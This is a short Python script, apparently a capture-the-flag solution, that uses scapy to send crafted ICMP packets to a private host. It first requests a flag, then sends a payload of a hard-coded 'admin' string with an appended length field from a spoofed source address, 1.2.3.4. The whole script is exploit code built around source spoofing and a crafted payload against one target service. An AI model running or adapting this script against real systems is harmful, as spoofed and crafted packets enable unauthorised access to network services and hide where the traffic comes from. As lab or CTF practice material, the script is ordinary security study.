from scapy.all import *
import sys
import struct

conf.L3socket=L3RawSocket

if len(sys.argv) != 2:
    icmp = IP(dst='192.168.11.15')/ICMP()/Raw('requestflag')
    send(icmp)

else:
    payload = 'admin01234567686543'
    payload += struct.pack('H', len(payload) + 2)
    icmp = IP(src='1.2.3.4', dst='192.168.11.15')/ICMP()/Raw(payload)
    sr1(icmp)
